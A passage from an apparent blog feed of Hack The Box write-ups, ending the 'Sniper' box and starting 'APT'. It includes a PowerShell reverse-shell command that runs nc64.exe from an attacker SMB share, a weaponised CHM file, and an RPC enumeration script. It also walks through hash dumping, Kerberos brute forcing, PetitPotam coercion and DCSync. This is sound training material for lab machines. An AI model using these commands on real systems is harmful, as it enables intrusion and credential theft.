<p>I check the users on the system with <code class="language-plaintext highlighter-rouge">net user</code> to <strong>get a list of usernames to reuse the password with</strong></p>

<p><img src="/assets/Sniper/local-users.jpg" alt="local-users" /></p>

<p>The password works for <code class="language-plaintext highlighter-rouge">chris</code></p>

<p><img src="/assets/Sniper/got-chris.jpg" alt="got-chris" /></p>

<h2 id="getting-a-shell-as-chris">Getting a shell as Chris</h2>
<p>The situation is that we want to pivot to the <code class="language-plaintext highlighter-rouge">chris</code> user <strong>without losing the shell</strong> <em>if possible</em></p>

<p>We can do so from our <strong>PowerShell</strong> prompt using the below method:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"Sniper\chris"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"36mEAhz/B8xQ~2VM"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">))</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Scriptblock</span><span class="w"> </span><span class="p">{</span><span class="n">\\10.10.16.3\s\nc64.exe</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nx">10.10.16.3</span><span class="w"> </span><span class="nx">9001</span><span class="p">}</span><span class="w"> </span><span class="nt">-AsJob</span><span class="w">
</span></code></pre></div></div>

<p>we’re basically <strong>creating a</strong> <code class="language-plaintext highlighter-rouge">credential</code> <strong>object</strong> for the <code class="language-plaintext highlighter-rouge">chris</code> user and <strong>invoking a local script as him</strong> but <em>as a job</em> to <strong>fork into a new process</strong> and <strong>leave our shell in tact.</strong></p>

<p><img src="/assets/Sniper/shell-as-chris.jpg" alt="shell-as-chris" /></p>

<p><strong>Neat :)</strong></p>

<h2 id="privilege-escalation-scanning-the-file-system">Privilege Escalation: Scanning the file system</h2>
<p><em>When checking the folders in chris’s user profile,</em> we find a file called <code class="language-plaintext highlighter-rouge">intructions.chm</code> in his <code class="language-plaintext highlighter-rouge">Downloads</code> folder.</p>

<p>We <strong>copy it over to our Kali using the SMB share.</strong></p>

<p><img src="/assets/Sniper/found-chm-file.jpg" alt="found-chm-file" /></p>

<p><em>When we open the file,</em> we get the <strong>content</strong> below:</p>

<p><img src="/assets/Sniper/chm-file-contents.jpg" alt="chm-file-contents" /></p>

<p><strong>This is information on the internal operations here:</strong></p>
<ul>
  <li>There’s <strong>a project of an android app</strong> <em>in development</em></li>
  <li><strong>That document</strong> looks like <strong>a draft for its documentation</strong></li>
</ul>

<p><em>other than that, according to the text,</em> it seems like the chris guy is really stressed out and thinking about quitting his job because the CEO is overloading him with work.</p>

<p>We don’t know if this information would be handy or not. But we take note of it nonetheless and move on.</p>

<p><em>In the system root</em> (<code class="language-plaintext highlighter-rouge">c:\</code>), we find a folder that <strong>sticks out:</strong> <code class="language-plaintext highlighter-rouge">Docs</code></p>

<p><em>Looking at its contents,</em> we see a <code class="language-plaintext highlighter-rouge">note.txt</code> file:</p>

<p><img src="/assets/Sniper/docs-and-note-txt.jpg" alt="docs-and-note-txt" /></p>

<p><em>Apart from the CEO bullying the chris guy,</em><br />
<em>and even leaving him a copy of</em> <code class="language-plaintext highlighter-rouge">"php for dummies-trial.pdf"</code> <em>as a further insult XD</em></p>

<ul>
  <li>he is <strong>asking about the documentation for the new app</strong> (<em>very possibly referring to the android project in development</em>).</li>
  <li>and <strong>wants him to drop it into this folder</strong> <code class="language-plaintext highlighter-rouge">"c:\Docs"</code> once done.</li>
</ul>

<p>Sounds like we need to <strong>create a malicious</strong> <code class="language-plaintext highlighter-rouge">.chm</code> file and put it there.</p>

<p><em>if the CEO happens to be the local <code class="language-plaintext highlighter-rouge">administrator</code> and opens the file,</em> we should root the box.</p>

<h2 id="chm-files-for-the-win">CHM Files for the win</h2>
<p><em>Searching</em> <strong>Google</strong>, we come accross this <a href="https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e">blog</a> explaining exactly <strong>how to execute a payload using a <code class="language-plaintext highlighter-rouge">.chm</code> file</strong> using a script from the <strong>Nishang script suite.</strong></p>

<p><em>Following the article,</em> we download the <strong>“HTML Help Workshop and Documentation program”</strong> and <strong>get the script</strong> from the <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">Github Repository</a>.</p>

<p>We <strong>import</strong> the <code class="language-plaintext highlighter-rouge">Out-CHM.ps1</code> file and use it to get a <code class="language-plaintext highlighter-rouge">doc.chm</code> file</p>

<p><img src="/assets/Sniper/generating-chm.jpg" alt="generating-chm" /></p>

<p><em>After copying it to the <code class="language-plaintext highlighter-rouge">Docs</code> folder and waiting a few moments,</em> The <code class="language-plaintext highlighter-rouge">.chm</code> file <strong>gets executed</strong>. and <strong>the Administrator’s password is changed</strong></p>

<p>We confirm with <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>

<p><img src="/assets/Sniper/got-admin.jpg" alt="got-admin" /></p>

<p><strong>Pretty fun box :]</strong></p>

<h2 id="unintended-path-rfi-through-smb">Unintended Path: RFI through SMB</h2>
<p><em>When checking the ability of adding network paths as the file inclusion payload,</em> we got <strong>PHP code execution:</strong></p>

<p><img src="/assets/Sniper/rfi-php-info.jpg" alt="rfi-php-info" /></p>

<p>This path is <strong>much easier</strong> but also <strong>teaches way less than the LFI one.</strong></p>

<h2 id="out-of-curiousity-a-look-at-the-php-within-the-blog-directorys-indexphp">Out of Curiousity: A look at the PHP within the blog directory’s <code class="language-plaintext highlighter-rouge">index.php</code></h2>
<p><img src="/assets/Sniper/lfi-hardening.jpg" alt="lfi-hardening" /></p>

<p>in <code class="language-plaintext highlighter-rouge">index.php</code>, we the code <strong>looks for <code class="language-plaintext highlighter-rouge">..</code> and <code class="language-plaintext highlighter-rouge">C:</code> within the included file path</strong> and <strong>throws an error if it detects any.</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">include</span> <span class="s1">'header.html'</span><span class="p">;</span> <span class="cp">?&gt;</span>
<span class="cp">&lt;?php</span>
<span class="nb">stream_wrapper_unregister</span><span class="p">(</span><span class="s2">"php"</span><span class="p">);</span>
<span class="nb">stream_wrapper_unregister</span><span class="p">(</span><span class="s2">"data"</span><span class="p">);</span> 
<span class="nv">$lang</span> <span class="o">=</span> <span class="s2">"blog-en.php"</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">ISSET</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'lang'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">include</span> <span class="nv">$lang</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
    <span class="nv">$lang</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'lang'</span><span class="p">];</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$lang</span><span class="p">,</span> <span class="s2">".."</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span> <span class="o">&amp;&amp;</span> <span class="nb">stripos</span><span class="p">(</span><span class="nv">$lang</span><span class="p">,</span> <span class="s2">"C:"</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Hardened 8)</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="k">include</span> <span class="nv">$lang</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">include</span> <span class="s2">"error.html"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="k">include</span> <span class="s2">"error.html"</span><span class="p">;</span>
        <span class="k">die</span><span class="p">();</span>
    <span class="p">}</span> 
<span class="p">}</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - APT</title><link href="http://localhost:4000/2022/07/07/APT.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - APT" /><published>2022-07-07T00:00:00+02:00</published><updated>2022-07-07T00:00:00+02:00</updated><id>http://localhost:4000/2022/07/07/APT</id><content type="html" xml:base="http://localhost:4000/2022/07/07/APT.html"><![CDATA[<p><img src="/assets/APT/APT.png" alt="APT" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li>A Windows machine where a standard IPv4 full TCP port scan reveals only <strong>HTTP</strong> on port 80 and <strong>RPC Endpoint Mapper</strong> on port 135.</li>
  <li><em>After checking out the website,</em> it turns out to be just static content with no real abusable functionalities.</li>
  <li><em>However, due to the many information that can be retrieved through the MSRPC protocol and because we have no other option,</em> we decide to dig deeper into what can be done through it.</li>
  <li>We come across an amazing article where we find that we can (<em>without authentication</em>) access a specific function in the legacy <strong>DCOM interface</strong> exported through RPC that would let us enumerate all the network interfaces on the machine.</li>
  <li><em>Thanks to a security researcher who has built a specific</em> <strong>python script</strong> <em>for that function,</em> we can use it and are able to get the network interace information.</li>
  <li>We find that the machine has an <strong>IPV6</strong> that when scanned with nmap reveals the full list of available ports which indicate a <strong>Windows Domain Controller.</strong></li>
  <li>The anonymously-accessible SMB share had a copy of the Active Directory database file <strong>NTDS.dit</strong> as well as the <strong>security</strong> and <strong>system</strong> registry hives in a folder structure similar to the output of the <code class="language-plaintext highlighter-rouge">ntdsutil</code> utility.</li>
  <li><em>With the given files, and using impacket’s</em> <code class="language-plaintext highlighter-rouge">secretsdump.py</code>, we are able to get a list of all domain usernames and hashes.</li>
  <li>We enumerate the users with <code class="language-plaintext highlighter-rouge">kerbrute</code> to only find 3 valid accounts (the default Administrator, the Domain Controller’s machine account and a user called <code class="language-plaintext highlighter-rouge">henry.vinson</code>).</li>
  <li>We try to brute force the user accounts with all the hashes from the dump over <strong>SMB</strong> but are <strong>blocked</strong> by the server when doing so.</li>
  <li><em>However, since we didn’t get a message indicating account lockout,</em> we changed the method of authentication to <strong>Kerberos</strong> (<em>as it doesn’t leave a 4625 logon event in the logs</em>) in hopes of bypassing the defenses in place.</li>
  <li><em>By building a bash wrapper around impacket’s silver ticket script</em> <code class="language-plaintext highlighter-rouge">getST.py</code>, we manage to brute force using the <strong>NTLM</strong> hashes to find a match with the <code class="language-plaintext highlighter-rouge">henry.vinson</code> user.</li>
  <li>The user had no <strong>WinRM</strong> access so we tried many things to enumerate the machine. <em>When scanning the contents of the</em> <strong>registry</strong> <em>through the available</em> <strong>remote registry service</strong>, we got a set of credentials for the <code class="language-plaintext highlighter-rouge">henry.vinson_adm</code> user.</li>
  <li>That user turned out to have <strong>WinRM</strong> access and we could successfully get a shell. We then used <code class="language-plaintext highlighter-rouge">WinPEAS</code> to run a regular privesc check. We had to switch the basic version for the obfuscated one because <strong>AMSI</strong> was detecting it.</li>
  <li><em>Looking at the tool’s output,</em> we find that the machine is misconfigured and uses the insecure and crackable <strong>NetNTLMv1</strong> in network authentication. A vulnerabiltiy that can be exploited for <strong>privilege escalation</strong>.</li>
  <li><em>Luckily,</em> a tool like <code class="language-plaintext highlighter-rouge">PetitPotam.py</code> can <strong>coerce authentication</strong> back to our attacker machine. We use it after setting up our <code class="language-plaintext highlighter-rouge">responder</code> to <em>downgrade</em> the authentication to <strong>NetNTLMv1</strong> as well as send a specific challenge to capture the machine account’s hash.</li>
  <li>We submit it to the <code class="language-plaintext highlighter-rouge">crack.sh</code> website which cracks it and emails us the NTLM version. We then use it to perform a <strong>DCSync</strong> attack.</li>
  <li><em>After retrieving the Administrator’s NTLM hash from the dump,</em> we use it to get <strong>complete access</strong> to the box in a typical pass-the-hash attack.</li>
  <li>The machine author’s intended way to achieve privilege escalation was through modifying the <strong>RoguePotato</strong> exploit to target IPV6, bypass AMSI then creating a special RPC server with impacket to respond with a challenge before capturing the NetNTLMv1 authentication.</li>
  <li><em>However, due to that path’s high complexity and due to the simpler tools currenly available,</em> I’m postponing it for when I know enough about RPC to be able to <em>decently</em> write about it.</li>
</ul>

<hr />

<h2 id="ipv4-nmap">IPv4 NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-title: Gigantic Hosting | Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre></div></div>

<p>The standard nmap full port scan shows:</p>
<ol>
  <li><strong>HTTP</strong> on port 80 served on <strong>IIS</strong> 10</li>
  <li><strong>MSRPC</strong> on port 135</li>
</ol>

<h2 id="checking-port-80">Checking Port 80</h2>
<p><em>Looking at the website,</em> we find a bunch of static html pages</p>

<p><img src="/assets/APT/Website-homepage.jpg" alt="Website-homepage" /></p>

<p>The linked web pages were:</p>

<ul>
  <li>index.html</li>
  <li>services.html</li>
  <li>clients.html</li>
  <li>about.html</li>
  <li>support.html</li>
  <li>news.html</li>
</ul>

<p>The content was mostly filler. We didn’t find anything of interest in the source code. No usernames were there apart from the sales email.</p>

<p><strong>Directory and file bruteforcing</strong> with <code class="language-plaintext highlighter-rouge">gobuster</code> didn’t get us anything new either.</p>

<p><em>Being left with port 135,</em> we decide to dive in.</p>

<h2 id="digging-deep-into-msrpc">Digging deep into MSRPC</h2>
<p>The <strong>Microsoft Remote Procedure Call</strong> is a protocol that allows a client program to request a service on another computer. Just like any typical client-server architecture.</p>

<p>It is mainly about <strong>Cross-Process Communication</strong> and <strong>Object Exchange</strong> over the network.</p>

<p><em>There are many functionalities in RPC,</em> so we’re interested to know how to use it.</p>

<p>Here are few terms we need to know before we can continue:</p>

<ul>
  <li><strong>The RPC End Point Mapper:</strong> The RPC Endpoint Mapper (RpcEptMapper) service resolves RPC interface identifiers to transport endpoints. It can be queried for functionalities.</li>
  <li><strong>Protocol Sequence Identifier:</strong> A numeric value that uniquely identifies an RPC transport protocol when describing a protocol in the context of a protocol stack.</li>
  <li><strong>RPC Endpoint:</strong> A network-specific address of a server process for RPC.</li>
  <li><strong>Universally Unique Identifier (UUID):</strong> An identifier that can be used in identifying objects in cross-process communication. In our case, a specific interface providing a special function of interest.</li>
  <li><strong>The Microsoft Component Object Model (COM):</strong> is a platform-independent, distributed, object-oriented system for creating binary software components that can interact.</li>
  <li><strong>The Distributed Component Object Model (DCOM):</strong> The Microsoft Component Object Model (COM) specification that defines how components communicate over networks.</li>
  <li><strong>Interface:</strong> A specification in a Component Object Model (COM) server that describes how to access the methods of a class.</li>
  <li><strong>Method:</strong> A function that can be called to execute a desired output.</li>
  <li><strong>Authentication Level:</strong> A numeric value indicating the level of authentication or message protection that remote procedure call (RPC) will apply to a specific message exchange</li>
  <li><strong>Opnum:</strong> An operation number or numeric identifier that is used to identify a specific remote procedure call (RPC) method or a method in an interface.</li>
</ul>

<p><em>With that out of the way,</em> here’s what we’re going to do:</p>

<ol>
  <li>Talk to the <strong>RPC Endpoint Mapper</strong> service on port 135.</li>
  <li>List all <strong>RPC Endpoints</strong> available.</li>
  <li><em>Per endpoint,</em> find the functionalities that <strong>don’t require authentication</strong>.</li>
  <li><em>By googling each endpoint’s UUID,</em> lookup Microsoft’s documentation on the <strong>available methods</strong> through it.</li>
  <li><em>If we find any,</em> we would also need to look for a way to invoke those functionalities.</li>
</ol>

<p><em>Since it’s the most relevant tool for the job,</em> let’s view the help for impacket’s <code class="language-plaintext highlighter-rouge">rpcmap.py</code> script.</p>

<p><img src="/assets/APT/rpcmap-help.jpg" alt="rpcmap-help" /></p>

<p><em>As far as points 1-3 go,</em> it seems that we have everything we need in this tool. we even have an example of what to use as a string binding value as indicated above.</p>

<p><strong>Command:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcmap.py ncacn_ip_tcp:10.10.10.213 <span class="nt">-brute-opnums</span> <span class="nt">-auth-level</span> 1
</code></pre></div></div>

<p><em>Looking at the output,</em> we see that we get <strong>“access denied”</strong> on most <strong>UUIDs</strong> and for most <strong>opnums</strong>. Except for a couple on <strong>“UUID 99FCFEC4-5260-101B-BBCB-00AA0021347A”</strong></p>

<p><img src="/assets/APT/rpcmap-output.jpg" alt="rpcmap-output" /></p>

<p>Let’s see what google search can find us for that <strong>UUID:</strong></p>

<p><img src="/assets/APT/google-uuid-search-results.jpg" alt="google-uuid-search-results" /></p>

<p><em>As you may have noticed from the link coloring,</em> I clicked all three links :D the second article is enough to get us through the first part of this machine.</p>

<p>But we’re going to take a brief look at Microsoft’s documentation first.</p>

<p>Our <strong>UUID</strong> is that of the <strong>“IID_IObjectExporter”</strong>.</p>

<p><img src="/assets/APT/object-exporter.jpg" alt="object-exporter" /></p>

<p>Here’s what we get when we click the link next to it:</p>

<p><img src="/assets/APT/object-exporter-methods.jpg" alt="object-exporter-methods" /></p>

<p><em>If you remember from</em> <code class="language-plaintext highlighter-rouge">rpcmap</code><em>’s output,</em> we had access to only <strong>opnums</strong> 3 &amp; 5</p>

<p><img src="/assets/APT/object-exporter-available-opnums.jpg" alt="object-exporter-available-opnums" /></p>

<p>when looking at opnum3, we see nothing significant:</p>

<p><img src="/assets/APT/serveralive-method.jpg" alt="serveralive-method" /></p>

<p>It just checks if the other host is up.</p>

<p>let’s look at <strong>opnum</strong> 5:</p>

<p><img src="/assets/APT/serveralive2-method.jpg" alt="serveralive2-method" /></p>

<p><strong>“It returns string and security bindings for the object resolver, which allows the client to choose the most appropriate, mutually compatible settings.”</strong></p>

<p><em>Since in our case, we’re the client,</em> we should get string and security bindings back when calling this method.</p>

<p>This would mean <strong>all the IP addresses</strong> on the box (including a potential <strong>IPv6</strong>) can be leaked.</p>

<p>But I don’t have much of a clue on how to do that XD</p>

<p>The 2nd search result <a href="/assets/APT/https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">here</a> seemed very promising.</p>

<p><img src="/assets/APT/airbus-article.jpg" alt="airbus-article" /></p>

<p>The <strong>Impacket</strong> library had the necessary code and the researcher was kind enough to provide a <strong>python</strong> script to get the job done.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">getopt</span>

<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5</span> <span class="kn">import</span> <span class="n">transport</span>
<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5.rpcrt</span> <span class="kn">import</span> <span class="n">RPC_C_AUTHN_LEVEL_NONE</span>
<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5.dcomrt</span> <span class="kn">import</span> <span class="n">IObjectExporter</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">argv</span><span class="p">):</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">opts</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">.</span><span class="n">getopt</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span><span class="s">"ht:"</span><span class="p">,[</span><span class="s">"target="</span><span class="p">])</span>
    <span class="k">except</span> <span class="n">getopt</span><span class="p">.</span><span class="n">GetoptError</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">'IOXIDResolver.py -t &lt;target&gt;'</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="n">target_ip</span> <span class="o">=</span> <span class="s">"192.168.1.1"</span>

    <span class="k">for</span> <span class="n">opt</span><span class="p">,</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">opts</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">opt</span> <span class="o">==</span> <span class="s">'-h'</span><span class="p">:</span>
            <span class="k">print</span> <span class="s">'IOXIDResolver.py -t &lt;target&gt;'</span>
            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
        <span class="k">elif</span> <span class="n">opt</span> <span class="ow">in</span> <span class="p">(</span><span class="s">"-t"</span><span class="p">,</span> <span class="s">"--target"</span><span class="p">):</span>
            <span class="n">target_ip</span> <span class="o">=</span> <span class="n">arg</span>

    <span class="n">authLevel</span> <span class="o">=</span> <span class="n">RPC_C_AUTHN_LEVEL_NONE</span>

    <span class="n">stringBinding</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'ncacn_ip_tcp:%s'</span> <span class="o">%</span> <span class="n">target_ip</span>
    <span class="n">rpctransport</span> <span class="o">=</span> <span class="n">transport</span><span class="p">.</span><span class="n">DCERPCTransportFactory</span><span class="p">(</span><span class="n">stringBinding</span><span class="p">)</span>

    <span class="n">portmap</span> <span class="o">=</span> <span class="n">rpctransport</span><span class="p">.</span><span class="n">get_dce_rpc</span><span class="p">()</span>
    <span class="n">portmap</span><span class="p">.</span><span class="n">set_auth_level</span><span class="p">(</span><span class="n">authLevel</span><span class="p">)</span>
    <span class="n">portmap</span><span class="p">.</span><span class="n">connect</span><span class="p">()</span>

    <span class="n">objExporter</span> <span class="o">=</span> <span class="n">IObjectExporter</span><span class="p">(</span><span class="n">portmap</span><span class="p">)</span>
    <span class="n">bindings</span> <span class="o">=</span> <span class="n">objExporter</span><span class="p">.</span><span class="n">ServerAlive2</span><span class="p">()</span>

    <span class="k">print</span> <span class="s">"[*] Retrieving network interface of "</span> <span class="o">+</span> <span class="n">target_ip</span>

    <span class="c1">#NetworkAddr = bindings[0]['aNetworkAddr']
</span>    <span class="k">for</span> <span class="n">binding</span> <span class="ow">in</span> <span class="n">bindings</span><span class="p">:</span>
        <span class="n">NetworkAddr</span> <span class="o">=</span> <span class="n">binding</span><span class="p">[</span><span class="s">'aNetworkAddr'</span><span class="p">]</span>
        <span class="k">print</span> <span class="s">"Address: "</span> <span class="o">+</span> <span class="n">NetworkAddr</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
   <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
</code></pre></div></div>

<p><em>When using it,</em> we get a very nice output:</p>

<p><img src="/assets/APT/python-enum-interfaces-script-output.jpg" alt="python-enum-interfaces-script-output" /></p>

<h2 id="ipv6-nmap">IPv6 NMAP</h2>
<p>After placing an entry for it in our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, we run another nmap on the <strong>IPv6</strong> using the <code class="language-plaintext highlighter-rouge">-6</code> flag. Look at what we got :D</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-07-02 15:54:05Z)
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Issuer: commonName=apt.htb.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-24T07:07:18
| Not valid after:  2050-09-24T07:17:18
| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Issuer: commonName=apt.htb.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-24T07:07:18
| Not valid after:  2050-09-24T07:17:18
| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Issuer: commonName=apt.htb.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-24T07:07:18
| Not valid after:  2050-09-24T07:17:18
| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Issuer: commonName=apt.htb.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-24T07:07:18
| Not valid after:  2050-09-24T07:17:18
| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc        Microsoft Windows RPC
49675/tcp open  msrpc        Microsoft Windows RPC
49695/tcp open  msrpc        Microsoft Windows RPC
60706/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: apt
|   NetBIOS computer name: APT\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System time: 2022-07-02T16:55:02+01:00
| smb2-time: 
|   date: 2022-07-02T15:55:01
|_  start_date: 2022-07-02T13:47:16
|_clock-skew: mean: -5h46m47s, deviation: 22m40s, median: -5h38m13s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
</code></pre></div></div>

<p>A full-fledged windows domain controller :D</p>

<p>Looks like a firewall was configured to only allow port 80 and 135 on IPv4 but allowed everything on IPv6.</p>

<p><strong>Lesson learned:</strong> Always enumerate network interfaces as part of the recon. There could be way more information to be learned about the network by doing this.</p>

<h2 id="smb-enumeration">SMB Enumeration</h2>
<p>We start with SMB and run <code class="language-plaintext highlighter-rouge">crackmapexec</code> to check the available shares. And we find a readable one called <strong>“backup”</strong></p>

<p><img src="/assets/APT/cme-smb-shares.jpg" alt="cme-smb-shares" /></p>

<p>we find a password when trying to unzip the file called <code class="language-plaintext highlighter-rouge">backup.zip</code></p>

<p><img src="/assets/APT/backup-zip.jpg" alt="backup-zip" /></p>

<p>we could successfully crack it with john’s <code class="language-plaintext highlighter-rouge">zip2john</code> script (It gave us an error but that wasn’t a concern).</p>

<p><img src="/assets/APT/cracking-zip-hash.jpg" alt="cracking-zip-hash" /></p>

<p><em>After unzipping the archive,</em> we get something very interesting. What appears to be an <strong>Active Directory Database Dump</strong>. This is exactly the output of a utility called <code class="language-plaintext highlighter-rouge">ntdsutil</code></p>

<p><img src="/assets/APT/unzipping-backup-zip.jpg" alt="unzipping-backup-zip" /></p>

<p>We dump the contents with <code class="language-plaintext highlighter-rouge">secretsdump.py</code> using the <code class="language-plaintext highlighter-rouge">-history</code> flag to get previous password hashes and <code class="language-plaintext highlighter-rouge">-just-dc-ntlm</code> to limit the output to what we can use in a pass-the-hash attack.</p>

<p><img src="/assets/APT/secrets_dump.jpg" alt="secrets_dump" /></p>

<p>Something is off here.. it can’t be that easy :D</p>

<p><em>Since those would be instant kills,</em> We tried:</p>
<ul>
  <li>Logging in with the Administrator’s hash</li>
  <li>Use the Domain Controller’s machine hash</li>
  <li>Create a golden ticket with the krbtgt hash</li>
</ul>

